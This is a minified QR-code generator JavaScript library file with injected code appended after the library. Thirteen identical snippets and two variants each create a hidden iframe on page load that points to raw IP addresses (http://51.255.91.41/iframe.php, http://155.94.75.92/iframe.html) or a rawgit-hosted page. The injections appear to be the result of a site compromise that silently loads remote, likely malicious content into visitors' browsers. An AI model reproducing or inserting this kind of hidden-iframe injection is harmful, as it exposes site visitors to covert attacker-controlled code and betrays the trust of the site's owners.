},getLostPoint:function(a){for(var b=a.getModuleCount(),c=0,d=0;d<b;d++)for(var e=0;e<b;e++){for(var k=0,g=a.isDark(d,e),f=-1;1>=f;f++)if(!(0>d+f||b<=d+f))for(var h=-1;1>=h;h++)0>e+h||b<=e+h||0==f&&0==h||g!=a.isDark(d+f,e+h)||k++;5<k&&(c+=3+k-5)}for(d=0;d<b-1;d++)for(e=0;e<b-1;e++)if(k=0,a.isDark(d,e)&&k++,a.isDark(d+1,e)&&k++,a.isDark(d,e+1)&&k++,a.isDark(d+1,e+1)&&k++,0==k||4==k)c+=3;for(d=0;d<b;d++)for(e=0;e<b-6;e++)a.isDark(d,e)&&!a.isDark(d,e+1)&&a.isDark(d,e+2)&&a.isDark(d,e+3)&&a.isDark(d,
e+4)&&!a.isDark(d,e+5)&&a.isDark(d,e+6)&&(c+=40);for(e=0;e<b;e++)for(d=0;d<b-6;d++)a.isDark(d,e)&&!a.isDark(d+1,e)&&a.isDark(d+2,e)&&a.isDark(d+3,e)&&a.isDark(d+4,e)&&!a.isDark(d+5,e)&&a.isDark(d+6,e)&&(c+=40);for(e=k=0;e<b;e++)for(d=0;d<b;d++)a.isDark(d,e)&&k++;return c+Math.abs(100*k/b/b-50)/5*10}},e={glog:function(a){if(1>a)throw Error("glog("+a+")");return e.LOG_TABLE[a]},gexp:function(a){for(;0>a;)a+=255;for(;256<=a;)a-=255;return e.EXP_TABLE[a]},EXP_TABLE:Array(256),LOG_TABLE:Array(256)},n=
0;8>n;n++)e.EXP_TABLE[n]=1<<n;for(n=8;256>n;n++)e.EXP_TABLE[n]=e.EXP_TABLE[n-4]^e.EXP_TABLE[n-5]^e.EXP_TABLE[n-6]^e.EXP_TABLE[n-8];for(n=0;255>n;n++)e.LOG_TABLE[e.EXP_TABLE[n]]=n;v.prototype={get:function(a){return this.num[a]},getLength:function(){return this.num.length},multiply:function(a){for(var b=Array(this.getLength()+a.getLength()-1),c=0;c<this.getLength();c++)for(var d=0;d<a.getLength();d++)b[c+d]^=e.gexp(e.glog(this.get(c))+e.glog(a.get(d)));return new v(b,0)},mod:function(a){if(0>this.getLength()-
a.getLength())return this;for(var b=e.glog(this.get(0))-e.glog(a.get(0)),c=Array(this.getLength()),d=0;d<this.getLength();d++)c[d]=this.get(d);for(d=0;d<a.getLength();d++)c[d]^=e.gexp(e.glog(a.get(d))+b);return(new v(c,0)).mod(a)}};w.RS_BLOCK_TABLE=[[1,26,19],[1,26,16],[1,26,13],[1,26,9],[1,44,34],[1,44,28],[1,44,22],[1,44,16],[1,70,55],[1,70,44],[2,35,17],[2,35,13],[1,100,80],[2,50,32],[2,50,24],[4,25,9],[1,134,108],[2,67,43],[2,33,15,2,34,16],[2,33,11,2,34,12],[2,86,68],[4,43,27],[4,43,19],[4,43,
15],[2,98,78],[4,49,31],[2,32,14,4,33,15],[4,39,13,1,40,14],[2,121,97],[2,60,38,2,61,39],[4,40,18,2,41,19],[4,40,14,2,41,15],[2,146,116],[3,58,36,2,59,37],[4,36,16,4,37,17],[4,36,12,4,37,13],[2,86,68,2,87,69],[4,69,43,1,70,44],[6,43,19,2,44,20],[6,43,15,2,44,16],[4,101,81],[1,80,50,4,81,51],[4,50,22,4,51,23],[3,36,12,8,37,13],[2,116,92,2,117,93],[6,58,36,2,59,37],[4,46,20,6,47,21],[7,42,14,4,43,15],[4,133,107],[8,59,37,1,60,38],[8,44,20,4,45,21],[12,33,11,4,34,12],[3,145,115,1,146,116],[4,64,40,5,
65,41],[11,36,16,5,37,17],[11,36,12,5,37,13],[5,109,87,1,110,88],[5,65,41,5,66,42],[5,54,24,7,55,25],[11,36,12],[5,122,98,1,123,99],[7,73,45,3,74,46],[15,43,19,2,44,20],[3,45,15,13,46,16],[1,135,107,5,136,108],[10,74,46,1,75,47],[1,50,22,15,51,23],[2,42,14,17,43,15],[5,150,120,1,151,121],[9,69,43,4,70,44],[17,50,22,1,51,23],[2,42,14,19,43,15],[3,141,113,4,142,114],[3,70,44,11,71,45],[17,47,21,4,48,22],[9,39,13,16,40,14],[3,135,107,5,136,108],[3,67,41,13,68,42],[15,54,24,5,55,25],[15,43,15,10,44,16],
[4,144,116,4,145,117],[17,68,42],[17,50,22,6,51,23],[19,46,16,6,47,17],[2,139,111,7,140,112],[17,74,46],[7,54,24,16,55,25],[34,37,13],[4,151,121,5,152,122],[4,75,47,14,76,48],[11,54,24,14,55,25],[16,45,15,14,46,16],[6,147,117,4,148,118],[6,73,45,14,74,46],[11,54,24,16,55,25],[30,46,16,2,47,17],[8,132,106,4,133,107],[8,75,47,13,76,48],[7,54,24,22,55,25],[22,45,15,13,46,16],[10,142,114,2,143,115],[19,74,46,4,75,47],[28,50,22,6,51,23],[33,46,16,4,47,17],[8,152,122,4,153,123],[22,73,45,3,74,46],[8,53,
23,26,54,24],[12,45,15,28,46,16],[3,147,117,10,148,118],[3,73,45,23,74,46],[4,54,24,31,55,25],[11,45,15,31,46,16],[7,146,116,7,147,117],[21,73,45,7,74,46],[1,53,23,37,54,24],[19,45,15,26,46,16],[5,145,115,10,146,116],[19,75,47,10,76,48],[15,54,24,25,55,25],[23,45,15,25,46,16],[13,145,115,3,146,116],[2,74,46,29,75,47],[42,54,24,1,55,25],[23,45,15,28,46,16],[17,145,115],[10,74,46,23,75,47],[10,54,24,35,55,25],[19,45,15,35,46,16],[17,145,115,1,146,116],[14,74,46,21,75,47],[29,54,24,19,55,25],[11,45,
15,46,46,16],[13,145,115,6,146,116],[14,74,46,23,75,47],[44,54,24,7,55,25],[59,46,16,1,47,17],[12,151,121,7,152,122],[12,75,47,26,76,48],[39,54,24,14,55,25],[22,45,15,41,46,16],[6,151,121,14,152,122],[6,75,47,34,76,48],[46,54,24,10,55,25],[2,45,15,64,46,16],[17,152,122,4,153,123],[29,74,46,14,75,47],[49,54,24,10,55,25],[24,45,15,46,46,16],[4,152,122,18,153,123],[13,74,46,32,75,47],[48,54,24,14,55,25],[42,45,15,32,46,16],[20,147,117,4,148,118],[40,75,47,7,76,48],[43,54,24,22,55,25],[10,45,15,67,46,
16],[19,148,118,6,149,119],[18,75,47,31,76,48],[34,54,24,34,55,25],[20,45,15,61,46,16]];w.getRSBlocks=function(a,b){var c=w.getRsBlockTable(a,b);if(void 0==c)throw Error("bad rs block @ typeNumber:"+a+"/errorCorrectLevel:"+b);a=c.length/3;b=[];for(var d=0;d<a;d++)for(var e=c[3*d+0],g=c[3*d+1],f=c[3*d+2],k=0;k<e;k++)b.push(new w(g,f));return b};w.getRsBlockTable=function(a,e){switch(e){case b.L:return w.RS_BLOCK_TABLE[4*(a-1)+0];case b.M:return w.RS_BLOCK_TABLE[4*(a-1)+1];case b.Q:return w.RS_BLOCK_TABLE[4*
(a-1)+2];case b.H:return w.RS_BLOCK_TABLE[4*(a-1)+3]}};q.prototype={get:function(a){return 1==(this.buffer[Math.floor(a/8)]>>>7-a%8&1)},put:function(a,b){for(var c=0;c<b;c++)this.putBit(1==(a>>>b-c-1&1))},getLengthInBits:function(){return this.length},putBit:function(a){var b=Math.floor(this.length/8);this.buffer.length<=b&&this.buffer.push(0);a&&(this.buffer[b]|=128>>>this.length%8);this.length++}};var l=[[17,14,11,7],[32,26,20,14],[53,42,32,24],[78,62,46,34],[106,84,60,44],[134,106,74,58],[154,
122,86,64],[192,152,108,84],[230,180,130,98],[271,213,151,119],[321,251,177,137],[367,287,203,155],[425,331,241,177],[458,362,258,194],[520,412,292,220],[586,450,322,250],[644,504,364,280],[718,560,394,310],[792,624,442,338],[858,666,482,382],[929,711,509,403],[1003,779,565,439],[1091,857,611,461],[1171,911,661,511],[1273,997,715,535],[1367,1059,751,593],[1465,1125,805,625],[1528,1190,868,658],[1628,1264,908,698],[1732,1370,982,742],[1840,1452,1030,790],[1952,1538,1112,842],[2068,1628,1168,898],[2188,
1722,1228,958],[2303,1809,1283,983],[2431,1911,1351,1051],[2563,1989,1423,1093],[2699,2099,1499,1139],[2809,2213,1579,1219],[2953,2331,1663,1273]],n=function(){var a=function(a,b){this._el=a;this._htOption=b};a.prototype.draw=function(a){function b(a,b){a=document.createElementNS("http://www.w3.org/2000/svg",a);for(var c in b)b.hasOwnProperty(c)&&a.setAttribute(c,b[c]);return a}var d=this._htOption,e=this._el,g=a.getModuleCount();this.clear();var f=b("svg",{viewBox:"0 0 "+String(g)+" "+String(g),
width:"100%",height:"100%",fill:d.colorLight});f.setAttributeNS("http://www.w3.org/2000/xmlns/","xmlns:xlink","http://www.w3.org/1999/xlink");e.appendChild(f);f.appendChild(b("rect",{fill:d.colorDark,width:"1",height:"1",id:"template"}));for(d=0;d<g;d++)for(e=0;e<g;e++)if(a.isDark(d,e)){var h=b("use",{x:String(d),y:String(e)});h.setAttributeNS("http://www.w3.org/1999/xlink","href","#template");f.appendChild(h)}};a.prototype.clear=function(){for(;this._el.hasChildNodes();)this._el.removeChild(this._el.lastChild)};
return a}(),y="svg"===document.documentElement.tagName.toLowerCase()?n:"undefined"==typeof CanvasRenderingContext2D?function(){var a=function(a,b){this._el=a;this._htOption=b};a.prototype.draw=function(a){for(var b=this._htOption,d=this._el,e=a.getModuleCount(),g=Math.floor(b.width/e),f=Math.floor(b.height/e),h=['\x3ctable style\x3d"border:0;border-collapse:collapse;"\x3e'],k=0;k<e;k++){h.push("\x3ctr\x3e");for(var l=0;l<e;l++)h.push('\x3ctd style\x3d"border:0;border-collapse:collapse;padding:0;margin:0;width:'+
g+"px;height:"+f+"px;background-color:"+(a.isDark(k,l)?b.colorDark:b.colorLight)+';"\x3e\x3c/td\x3e');h.push("\x3c/tr\x3e")}h.push("\x3c/table\x3e");d.innerHTML=h.join("");a=d.childNodes[0];d=(b.width-a.offsetWidth)/2;b=(b.height-a.offsetHeight)/2;0<d&&0<b&&(a.style.margin=b+"px "+d+"px")};a.prototype.clear=function(){this._el.innerHTML=""};return a}():function(){function a(){this._elImage.src=this._elCanvas.toDataURL("image/png");this._elImage.style.display="block";this._elCanvas.style.display="none"}
function b(a,b){var c=this;c._fFail=b;c._fSuccess=a;null===c._bSupportDataURI?(a=document.createElement("img"),b=function(){c._bSupportDataURI=!1;c._fFail&&_fFail.call(c)},a.onabort=b,a.onerror=b,a.onload=function(){c._bSupportDataURI=!0;c._fSuccess&&c._fSuccess.call(c)},a.src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg\x3d\x3d"):!0===c._bSupportDataURI&&c._fSuccess?c._fSuccess.call(c):!1===c._bSupportDataURI&&
c._fFail&&c._fFail.call(c)}if(this._android&&2.1>=this._android){var c=1/window.devicePixelRatio,d=CanvasRenderingContext2D.prototype.drawImage;CanvasRenderingContext2D.prototype.drawImage=function(a,b,e,g,f,h,k,l,p){if("nodeName"in a&&/img/i.test(a.nodeName))for(var m=arguments.length-1;1<=m;m--)arguments[m]*=c;else"undefined"==typeof l&&(arguments[1]*=c,arguments[2]*=c,arguments[3]*=c,arguments[4]*=c);d.apply(this,arguments)}}var e=function(a,b){this._bIsPainted=!1;this._android=x();this._htOption=
b;this._elCanvas=document.createElement("canvas");this._elCanvas.width=b.width;this._elCanvas.height=b.height;a.appendChild(this._elCanvas);this._el=a;this._oContext=this._elCanvas.getContext("2d");this._bIsPainted=!1;this._elImage=document.createElement("img");this._elImage.alt="Scan me!";this._elImage.style.display="none";this._el.appendChild(this._elImage);this._bSupportDataURI=null};e.prototype.draw=function(a){var b=this._elImage,c=this._oContext,d=this._htOption,e=a.getModuleCount(),g=d.width/
e,f=d.height/e,h=Math.round(g),k=Math.round(f);b.style.display="none";this.clear();for(b=0;b<e;b++)for(var l=0;l<e;l++){var m=a.isDark(b,l),p=l*g,n=b*f;c.strokeStyle=m?d.colorDark:d.colorLight;c.lineWidth=1;c.fillStyle=m?d.colorDark:d.colorLight;c.fillRect(p,n,g,f);c.strokeRect(Math.floor(p)+.5,Math.floor(n)+.5,h,k);c.strokeRect(Math.ceil(p)-.5,Math.ceil(n)-.5,h,k)}this._bIsPainted=!0};e.prototype.makeImage=function(){this._bIsPainted&&b.call(this,a)};e.prototype.isPainted=function(){return this._bIsPainted};
e.prototype.clear=function(){this._oContext.clearRect(0,0,this._elCanvas.width,this._elCanvas.height);this._bIsPainted=!1};e.prototype.round=function(a){return a?Math.floor(1E3*a)/1E3:a};return e}();t=function(a,e){this._htOption={width:256,height:256,typeNumber:4,colorDark:"#000000",colorLight:"#ffffff",correctLevel:b.H};"string"===typeof e&&(e={text:e});if(e)for(var c in e)this._htOption[c]=e[c];"string"==typeof a&&(a=document.getElementById(a));this._android=x();this._el=a;this._oQRCode=null;this._oDrawing=
new y(this._el,this._htOption);this._htOption.text&&this.makeCode(this._htOption.text)};t.prototype.makeCode=function(a){var e=this._htOption.correctLevel,c=1,d;d=encodeURI(a).toString().replace(/\%[0-9a-fA-F]{2}/g,"a");d=d.length+(d.length!=a?3:0);for(var f=0,h=l.length;f<=h;f++){var k=0;switch(e){case b.L:k=l[f][0];break;case b.M:k=l[f][1];break;case b.Q:k=l[f][2];break;case b.H:k=l[f][3]}if(d<=k)break;else c++}if(c>l.length)throw Error("Too long data");this._oQRCode=new g(c,this._htOption.correctLevel);
this._oQRCode.addData(a);this._oQRCode.make();this._el.title=a;this._oDrawing.draw(this._oQRCode);this.makeImage()};t.prototype.makeImage=function(){"function"==typeof this._oDrawing.makeImage&&(!this._android||3<=this._android)&&this._oDrawing.makeImage()};t.prototype.clear=function(){this._oDrawing.clear()};t.CorrectLevel=b;window.QRCode=t})()})},"*noref":1}});define(["./usng/usng","./storejs/json","./storejs/store","./md5/md5","./qrcode"],function(){});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});